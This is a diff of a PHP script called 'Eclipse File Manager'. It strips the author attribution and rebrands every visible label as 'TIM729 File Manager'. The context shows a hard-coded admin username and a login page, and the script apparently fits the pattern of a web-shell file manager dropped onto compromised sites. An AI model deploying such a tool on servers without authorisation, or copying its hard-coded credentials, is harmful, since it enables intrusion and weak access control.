@@ -1,9 +1,5 @@
 <?php
-/**
- * Eclipse File Manager ~ version 1.0
- * @author NowMeee
- * @github https://github.com/eclibesec/EclipseFileManager
- */
+
 session_start();
 $current_filename = basename($_SERVER['SCRIPT_FILENAME']);
 $default_username = 'ampunpak'; // admin
@@ -21,7 +17,7 @@ if (isset($_POST['login'])) {
         
         $_SESSION['alert'] = [
             'type' => 'success',
-            'message' => 'Login successful! Welcome to Eclipse File Manager.'
+            'message' => 'Login successful! Welcome to TIM729 File Manager.'
         ];
         header("Location: $current_filename");
         exit;
@@ -435,7 +431,7 @@ $theme = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'light';
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eclipse File Manager</title>
+    <title>TIM729 File Manager</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/dracula.min.css">
@@ -452,7 +448,7 @@ $theme = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'light';
     <div class="login-container">
         <div class="login-card">
             <div class="login-header">
-                <h2>Eclipse File Manager</h2>
+                <h2>TIM729 File Manager</h2>
                 <p>Please login first</p>
             </div>
             <div class="login-body">
@@ -479,7 +475,7 @@ $theme = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'light';
                 </form>
             </div>
             <div class="login-footer">
-                <p class="text-muted text-sm">Eclipse File Manager</p>
+                <p class="text-muted text-sm">TIM729 File Manager</p>
             </div>
         </div>
     </div>
@@ -491,7 +487,7 @@ $theme = isset($_COOKIE['theme']) ? $_COOKIE['theme'] : 'light';
             <div class="sidebar-header">
                 <div class="logo">
                     <i class="fas fa-folder"></i>
-                    <span>Eclipse File Manager</span>
+                    <span>TIM729 File Manager</span>
                 </div>
                 <button class="btn btn-sm btn-icon btn-light mobile-toggle" id="closeSidebar">
                     <i class="fas fa-times"></i>
